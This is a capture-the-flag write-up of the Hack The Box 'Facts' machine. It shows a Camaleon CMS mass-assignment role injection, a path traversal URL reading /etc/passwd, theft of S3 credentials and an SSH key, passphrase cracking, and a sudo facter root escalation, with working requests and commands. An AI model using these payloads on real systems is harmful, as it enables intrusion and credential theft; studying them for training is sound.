---
title: "HTB-Facts"
date: 2026-02-01
draft: false
summary: "Discovered Camaleon CMS 2.9.0 with two critical vulnerabilities: CVE-2025-2304 (mass assignment privilege escalation) and CVE-2024-46987 (path traversal). Escalated to admin, extracted S3 credentials, downloaded SSH private key from MinIO bucket, cracked passphrase, and achieved root via sudo facter exploitation."
tags:
  - Web
  - CVE-2025-2304
  - CVE-2024-46987
  - s3
  - CamaleonCMS
  - facter
  - nmap
  - gobuster
platform: Web
---

{{< infobox difficulty="Easy" os="Linux" date="2026-02-01" >}}

### TL;DR
Discovered Camaleon CMS 2.9.0 with two critical vulnerabilities: CVE-2025-2304 (mass assignment privilege escalation) and CVE-2024-46987 (path traversal). Escalated to admin, extracted S3 credentials, downloaded SSH private key from MinIO bucket, cracked passphrase, and achieved root via sudo facter exploitation.


### <span style="color:red">Reconnaissance</span>
#### nmap
MinIO running on 54321, Nginx on 80, SSH on 22.
```console
$ nmap 10.129.23.220 -p- -A --min-rate 5000
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
54321/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://10.129.23.220:9001
|_http-server-header: MinIO
| ...[snip]...
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>18901AD8038ADDBE</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
```
Added entry to hosts file.
```console
$ tail -1 /etc/hosts
10.129.23.220   facts.htb
```
#### MinIO 
I attempted to access files directly from MinIO:
```console
$ curl -O http://10.129.23.220:54321/facts/Trinity.txt.bak && cat Trinity.txt.bak                                   
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied.</Message><Key>Trinity.txt.bak</Key><BucketName>facts</BucketName><Resource>/facts/Trinity.txt.bak</Resource><RequestId>18901CC37DD3D84E</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error> 
```
Accessing the endpoint revealed a bucket name `facts` and a file `Trinity.txt.bak` via error messages, though direct access was denied without credentials.

#### Directory 
Admin panel discovered at `http://facts.htb/admin/login`. 
```console
$ gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50
...[snip]...
/admin.php            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
```
![login_form](image.png)

### <span style="color:red">privilege esc (Web)</span>
#### CVE-2025-2304
After registering, i identified the CMS version as **2.9.0**. This version is vulnerable to Privilege Escalation via Mass Assignment (CVE-2025-2304)
![dashboard](image1.png)

When a user wishes to change his password, the `updated_ajax` method is called.
```ruby
def updated_ajax
  @user = current_site.users.find(params[:user_id])
  update_session = current_user_is?(@user)

  @user.update(params.require(:password).permit!)      # permit!
  render inline: @user.errors.full_messages.join(', ')

  update_auth_token_in_cookie @user.auth_token if update_session && @user.saved_change_to_password_digest?
end
```
The `permit!` method allows all parameters without filtering, enabling injection of arbitrary attributes like `role`.
![Initialization Function](image3.png)

Intercepted the password change request in burpsuite and injected the admin role parameter: `&password%5Brole%5D=admin` i successfully escalated to Administrator role.
```http
POST /admin/settings/update_ajax HTTP/1.1
Host: facts.htb
Content-Type: application/x-www-form-urlencoded

method=patch&authenticity_token=...&password%5Bpassword%5D=bubka&password%5Bpassword_confirmation%5D=bubka&password%5Brole%5D=admin
```
![Initialization Function](image4.png)


### <span style="color:red">S3 Bucket Enumeration</span>
inside the Admin Panel, navigated to Filesystem Settings i found AWS S3 credentials.  
\- **access key: AKIA3F617ACD8741FC75**  
\- **secret key: Uk+ffaKCv/sMGtFrSQAKI6Lz/k7Y5myaMDsoc88X**  
![Initialization Function](image5.png)

I configured AWS CLI with the discovered credentials and checked listed available buckets:
```console
$ aws --endpoint-url http://10.129.23.220:54321 s3 ls --profile facts
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```
`internal` bucket contained a user's home directory, including `.ssh/` folder.
```console
$ aws --endpoint-url http://10.129.23.220:54321 s3 ls s3://internal --profile facts
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 13:45:13        220 .console_logout
2026-01-08 13:45:13       3900 .consolerc
2026-01-08 13:47:17         20 .lesshst
2026-01-08 13:47:17        807 .profile
```
Found SSH keys:
```console
$ cat authorized_keys 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJcPXX7amOBoIuEwZV634c4MhXpNMI6lPPpIElQSoEgG 
$ cat id_ed25519     
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBb7hiP9q
v6NehImbaqDycxAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIJcPXX7amOBoIuEw
ZV634c4MhXpNMI6lPPpIElQSoEgGAAAAoOUbnZGaJ3tgD7oBU+eMP80aIG77UpJO6hwvNZ
M1tvDC0mNoRSa6ro6niOpPxaBS0D1SAqoHGcuYhZKFNWfYr6rrhNwkiF4R+VyFhxC0TB2e
fCO1e2EEc4MD0d6aHwVG2DJ5OQYshbaYnEzI4/n4KvA/ocGxVbw1nSiwtBrrGoohoepqV+
G6oZ7gknyOhCrO9STNNqq2MCODFgm0IzEDch4=
-----END OPENSSH PRIVATE KEY-----
```

The private key was encrypted. Converted to hash and cracked with John the Ripper.
```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
dragonballz      (id_ed25519)     
```
### <span style="color:red">User Enumeration</span>
#### CVE-2024-46987
To enumerate users I exploited another vulnerability. The `download_private_file` method contains a path traversal flaw:
```ruby
def download_private_file
  cama_uploader.enable_private_mode!

  file = cama_uploader.fetch_file("private/#{params[:file]}")

  send_file file, disposition: 'inline'
end
```
The `file` parameter is not sanitized, allowing directory traversal:
```
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```
```console
$ cat passwd
...[snip]...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/console
william:x:1001:1001::/home/william:/bin/console
```

### <span style="color:red">shell as trivia</span>
using ssh with private key i gained access to trivia

```console
$ ssh -i id_ed25519 trivia@10.129.23.220                                                   
Enter passphrase for key 'id_ed25519': 
...[snip]...
trivia@facts:/home/william$ cat /home/william/user.txt 
7d4a27*********************
```

### <span style="color:red">shell as root</span>
#### Facter Exploitation
Checked sudo permissions:
```console
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```
The first `.rb` file in the `/path/to/dir/` directory will be executed.

```console
trivia@facts:~$ cat priv.rb
exec("/bin/console")
trivia@facts:~$ sudo facter --custom-dir=.
root@facts:/home/trivia# id
uid=0(root) gid=0(root) groups=0(root)
root@facts:/home/trivia# cat /root/root.txt
5f9c237****************************
```


